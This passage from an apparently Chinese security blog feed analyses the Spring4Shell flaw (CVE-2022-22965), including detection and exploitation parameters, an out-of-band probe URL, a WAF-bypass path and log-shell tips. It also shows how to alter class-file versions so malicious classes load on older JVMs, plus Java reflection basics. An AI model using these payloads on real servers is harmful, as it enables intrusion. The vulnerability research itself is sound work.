title="注意事项"></a>注意事项</h3><ul><li>如果要多次写文件，需要修改fileDateFormat属性，最终会拼接到文件后缀里面</li><li>利用日志写入shell的时候，生成的文件会不断写入，可以关闭日志记录: <code>class.module.classLoader.resources.context.parent.pipeline.first.enabled=false</code></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当Content-Type是<code>application/x-www-form-urlencoded</code>的时候，会使用<code>ServletModelAttributeMethodProcessor</code>解析请求，然后进入参数绑定:<code>org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)</code>:<br><img src="/2022/04/06/CVE-2022-22965/3.png"><br>此时的mpv保存了请求里面的key-value参数，接着进入<code>org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)</code>对获取到的<code>mpvs</code>进行初步校验：<br><img src="/2022/04/06/CVE-2022-22965/4.png"></p><p>将mpvs绑定到bean对象上<code>setPropertyValues</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractPropertyAccessor</span>#<span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>PropertyValues</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/06/CVE-2022-22965/5.png"></p><p>然后进入到<code>setPropertyValue</code></p><pre class="line-numbers language-none"><code class="language-none">org.springframework.beans.AbstractNestablePropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入到: <code>getPropertyAccessorForPropertyPath</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractNestablePropertyAccessor</span>#<span class="token function">getPropertyAccessorForPropertyPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> propertyPath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候<code>propertyPath</code>是http请求里面注入的变量: <code>class.module.classLoader.resources.context.parent.appBase</code>，此时对变量进行分割，获取第一个class的偏移量，到最后都会进入到<code>org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults</code>里面进行验证，这里是判断当获取到的对象是一个Class而又获取ClassLoader属性，则直接跳过。<br><img src="/2022/04/06/CVE-2022-22965/8.png"></p><p>Struts出现漏洞的时候，有师傅写过<a href="https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b20/struts-tester/struts-tester.jsp">jsp获取可用的环境变量</a>的脚本，可以获取可用的上下文环境变量。</p><p>代码审计phith0n师傅对漏洞的总结：</p><blockquote><p>在Java里面，所有的Java对象都有一个<code>getClass()</code>方法，获取对象的Class，Class又有<code>getClassLoader()</code>方法获取Class的<code>ClassLoader</code>，而在Tomcat中，一些和Tomcat的全局配置相关的属性都保存在<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这个Tomcat专属的ClassLoader的一些属性、子孙属性里。<br>那么，我们就可以通过person.getClass().getClassLoader().getXXX()来调用ParallelWebappClassLoader中的一些敏感属性最后通过修改Tomcat的配置来执行危险操作。这个调用链放在用户数据包里就是class.classLoader.XXX</p></blockquote><h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><h4 id="根据状态码"><a href="#根据状态码" class="headerlink" title="根据状态码"></a>根据状态码</h4><ul><li>返回500: <code>class.module.class.module.classLoader.xx</code></li><li>返回400: <code>class.module.classLoader.DefaultAssertionStatus=nonsense</code></li><li>返回302: <code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code></li></ul><p>返回302的时候需要同时满足三个条件:</p><ol><li>请求路径不能以<code>/</code>结尾</li><li>context的<code>mapperDirectoryRedirectEnabled</code>属性为true</li><li>访问的地址是存在的一个目录</li></ol><p>当<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=false</code>的时候，访问一个存在的目录是404：<br><img src="/2022/04/06/CVE-2022-22965/1.png"><br>当<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code>：<br><img src="/2022/04/06/CVE-2022-22965/2.png"></p><h4 id="通过SSRF"><a href="#通过SSRF" class="headerlink" title="通过SSRF"></a>通过SSRF</h4><p>不推荐使用，如果应用使用了<code>configFile</code>会破坏运行环境：</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.configFile&#x3D;https:&#x2F;&#x2F;&#123;&#123;interactsh-url&#125;&#125;&amp;class.module.classLoader.resources.context.configFile.content.aaa&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="使用-RequestBody"><a href="#使用-RequestBody" class="headerlink" title="使用@RequestBody"></a>使用@RequestBody</h4><p>先检查项目中使用POJO的接口，然后再检查是否使用了<code>@RequestBody</code>注解。使用<code>@RequestBody</code>注解的接口是接收JSON和XML等请求，底层使用<code>RequestResponseBodyMethodProcessor</code>处理请求，而Content-Type是<code>application/x-www-form-urlencoded</code>的时候，会使用<code>ServletModelAttributeMethodProcessor</code>解析请求。所以使用<code>@RequestBody</code>的时候不存在漏洞，可以使用egrep初步匹配之后，排查没有使用<code>@RequestBody</code>的接口:</p><pre class="line-numbers language-none"><code class="language-none">egrep -5  -ri &quot;@(Get|Post|Put|Delete|Patch|Request)Mapping&quot; .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用<code>@RequestBody</code>的时候，如果自定义了<a href="https://blog.csdn.net/justry_deng/article/details/99875548">参数解析器</a>，也就是说后端可以同时接收<code>application/json</code>和<code>application/x-www-form-urlencoded</code>这两种请求，也可能存在漏洞。在测试JSON接口的时候可以改变Content-Type为<code>application/x-www-form-urlencoded</code>做一次尝试。</p><p>SpringMVC的<code>HandlerMethodArgumentResolver</code>是方法参数解析器接口，这个接口是SpringMVC参数解析绑定的核心接口，内置了很多类完成<a href="https://github.com/spring-projects/spring-framework/blob/d84ca2ba90d27a7c63d7b35a6259b5b9cf341118/spring-webmvc/src/main/java/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.java#L644">参数解析</a>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Annotation-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletModelAttributeMethodProcessor</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestResponseBodyMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestPartMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletCookieValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExpressionValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Type-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletRequestMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletResponseMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HttpEntityMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedirectAttributesMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ModelMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MapMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorsMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionStatusMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UriComponentsBuilderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">KotlinDetector</span><span class="token punctuation">.</span><span class="token function">isKotlinPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContinuationHandlerMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如:</p><ul><li><code>RequestParamMethodArgumentResolver</code>：   负责解析 @RequestParam 标记的参数</li><li><code>ServletRequestMethodArgumentResolver</code>： 负责解析入参为 HttpServletRequest、HttpMethod 等类型的参数</li><li><code>ServletModelAttributeMethodProcessor</code>： 负责解析入参为 POJO 类的参数</li><li><code>RequestResponseBodyMethodProcessor</code>：   负责解析入参为 @RequestBody 标注的参数</li></ul><h4 id="使用consumes的时候"><a href="#使用consumes的时候" class="headerlink" title="使用consumes的时候"></a>使用consumes的时候</h4><p><code>@RequestMapping(value = &quot;/rapid7/v1&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;, consumes = &quot;application/json&quot;)</code><br>经过测试，未触发漏洞</p><h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><p>来自<a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">烽火台实验室的绕过</a>：</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.resources.context.parent.pipeline.first.pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级Spring Framework到v5.3.18或v5.2.20</p><p>Spring升级之后Tomcat也发布了新版本，在<code>Tomcat 9.0.62</code>版本对<code>getResources()</code>方法的返回值做了修改，直接返回null。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在Web应用部署方式中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。<br><img src="/2022/04/06/CVE-2022-22965/9.png"></p><p>其它中间件的部分环境变量可以参考<a href="https://github.com/julianvilas/rooted2k15/blob/a00055f906/struts-tester/results/struts2-tomcat8-debug.txt">struts-tester</a></p><p><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>的实际案例的利用原理也差不多，但是更有趣。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://tttang.com/archive/1532/">从零开始，分析Spring Framework RCE</a></li><li><a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">关于Spring framework rce（CVE-2022-22965）的一些问题思考</a></li><li><a href="https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg">CVE-2022-22965 Spring核心框架Spring4Shell远程命令执行漏洞原理与修复方式分析</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">nuclei-templates</a></li><li><a href="https://xz.aliyun.com/t/11129">Spring Beans RCE分析</a></li><li><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">Spring 参数绑定的分析以及甲方自查</a></li><li><a href="https://d3fence.com/spring4shell-CVE-2022-22965-e2bdda3a816a4e5480a0bbcaabda2f8d">spring4shell（CVE-2022-22965）事件考古资料梳理</a></li><li><a href="https://juejin.cn/post/6894026079116197896">SpringMVC 入参解析原理和实战</a></li><li><a href="https://www.cnblogs.com/w-y-c-m/p/8443892.html">SpringMVC源码之参数解析绑定原理</a></li><li><a href="https://www.aqniu.com/industry/82365.html">Spring远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>低版本Java运行高版的Class</title>
      <link href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html"/>
      <url>/2022/03/30/Load_Class_In_Multi_JavaVersion.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-背景介绍"><a href="#0x1-背景介绍" class="headerlink" title="0x1. 背景介绍"></a>0x1. 背景介绍</h2><p>比如<code>fastjson</code>、<code>log4j</code>中需要远程加载恶意class文件的时候，如果恶意Class文件的版本高于目标版本，比如托管在服务器的Class是1.8编译的，但是目标版本是1.7，会导致利用失败。出现类似这样的错误：<code>java.lang.UnsupportedClassVersionError: Unsupported major.minor version</code></p><h2 id="0x2-解决方法"><a href="#0x2-解决方法" class="headerlink" title="0x2. 解决方法"></a>0x2. 解决方法</h2><p>用低版本的Java，比如1.6去编译Class文件，就可以全版本通用。</p><p>还有另外一种方法，手动修改Class文件。当Java版本不同的时候，编译出来的Class文件也会不一样，其中Class文件里面会带上编译的Java版本号：<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png"></p><ul><li>45 = Java 1.1</li><li>46 = Java 1.2</li><li>47 = Java 1.3</li><li>48 = Java 1.4</li><li>49 = Java 5</li><li>50 = Java 6</li><li>51 = Java 7</li><li>52 = Java 8</li><li>53 = Java 9</li><li>54 = Java 10</li><li>55 = Java 11</li><li>56 = Java 12</li><li>57 = Java 13</li><li>58 = Java 14</li><li>59 = Java 15</li></ul><p>所以，尝试手动修改一下这个版本号试试？</p><ol><li>切换到<code>java</code>的15版本，编译运行正常</li><li>使用<code>vim -b Calc.class</code>，然后<code>:%!xxd</code>修改版本号为<code>32</code>(50的16进制，也就是Java6)，然后保存:<code>:%!xxd -r</code></li><li>切换java版本到1.7，运行Class正常<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png"><br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全笔记(1)-反射机制</title>
      <link href="/2022/03/22/java-reflection.html"/>
      <url>/2022/03/22/java-reflection.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-类加载器-ClassLoader"><a href="#0x1-类加载器-ClassLoader" class="headerlink" title="0x1. 类加载器: ClassLoader"></a>0x1. 类加载器: ClassLoader</h2><p>Java是一个依赖于<code>JVM（Java虚拟机)</code>实现的跨平台的开发语言，<code>Java</code>会先通过编译器将源代码转换为Java二进制字节码，一般是保存在<code>.class</code>文件中，之后通过<code>JVM</code>解释器执行这段代码。字节码文件会包含很多Class信息，在JVM解释器运行的过程中，<code>ClassLoader</code>就是用来加载类的，它会将Java字节码中的Class加载到内存中，而每个<code>Class</code>对象内部都有一个<code>ClassLoader</code>属性标识由哪个<code>ClassLoader</code>加载。</p><h3 id="常见的ClassLoader"><a href="#常见的ClassLoader" class="headerlink" title="常见的ClassLoader"></a>常见的ClassLoader</h3><p>一切的<code>Java</code>类都必须经过JVM加载之后才可以运行，最常见的<code>ClassLoader</code>： <code>BootstrapClassLoader</code>、<code>ExtensionClassLoader</code>、<code>AppClassLoader</code>、<code>URLClassLoader</code>、<code>ContextClassLoader</code></p><h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p>JVM内置的默认<code>classLoader</code>,负责加载JVM运行时的核心类，位于<code>JAVA_HOME/lib/rt.jar/</code>文件夹中，由C代码实现，<code>Bootstrap ClassLoader</code>类加载器所加载的类的ClassLoader时候都会返回null</p><h4 id="ExtClassLoader"><a href="#ExtClassLoader" class="headerlink" title="ExtClassLoader"></a>ExtClassLoader</h4><p>扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 <code>JAVA_HOME/lib/ext/*.jar</code> 中，库名通常以 javax 开头</p><h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p>应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载<code>ClASSPATH</code>环境变量或者<code>java.class.path</code>属性里定义的路径中的jar包和目录，我们自己编写和使用的第三方Jar包通常都是由它来加载</p><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">demo1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaClassLoader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> extensionClassLoader <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App Classloader: "</span> <span class="token operator">+</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The parent of parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-none"><code class="language-none">App Classloader: sun.misc.Launcher$AppClassLoader@18b4aac2parent Classloader: sun.misc.Launcher$ExtClassLoader@5cad8086The parent of parent Classloader: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ClassLoader</code>类有如下常见的方法:</p><ul><li><code>loadClass</code>:参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用<code>loadClass()</code>，如果都没找到则调用<code>findClass()</code>。这种寻找类的方式称为<a href="https://www.cnblogs.com/JonaLin/p/12674114.html">双亲委派机制(delegation model)</a>,主要是为了安全性，避免用户自己编写的类动态替换Java的一些核心类，同时也避免了重复加载。<br><img src="/2022/03/22/java-reflection/1.png"><br>双亲委派：<br><img src="/2022/03/22/java-reflection/2.png"></li><li><code>findClass</code>: 搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。</li><li><code>findloadedClass</code>: 查找JVM已经加载过的类</li><li><code>defineClass</code>: 将字节码转换为JVM的<code>java.lang.Class</code>对象</li></ul><p>代码中关于<code>defineClass</code>还是比较值得一看，<code>loadClass</code>的作用是加载Class文件，转换为字节码，当class不是在文件里面，而是从其它来源的时候，比如网络请求，这个时候就轮到<code>defineClass</code>上场了，<code>defineClass</code>负责把byte[]直接转换为Class，也就是说<code>defineClass</code>是对类加载方式的扩展: </p><blockquote><p> However, some classes may not originate from a file; they may originatefrom other sources, such as the network, or they could be constructed by anapplication.  The method {@link #defineClass(String, byte[], int, int)<tt>defineClass</tt>} converts an array of bytes into an instance of class<tt>Class</tt>. Instances of this newly defined class can be created using{@link Class#newInstance <tt>Class.newInstance</tt>}.</p></blockquote><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><h4 id="获取Class对象的四种方法"><a href="#获取Class对象的四种方法" class="headerlink" title="获取Class对象的四种方法"></a>获取Class对象的四种方法</h4><p>反射的主要作用是通过Class对象来对类的属性和方法进行获取和调用，包括类的私有方法（protected和private），一般来说有两种方法可以获取类：</p><ol><li><code>obj.getClass()</code>: 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过<code>obj.getClass()</code>来获取它的类 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span> obj <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><code>Class.forName</code>:  <code>Class c= Class.forName(&quot;java.lang.Runtime&quot;);</code></li><li><code>ClassLoader</code>: <code>Class clazz = Classloader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code></li><li>原生类.class: <code>Class clazz  = java.lang.Runtime.class;</code></li></ol><p><code>forName</code>有两个函数重载：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code><br>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token comment">// 等于</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token 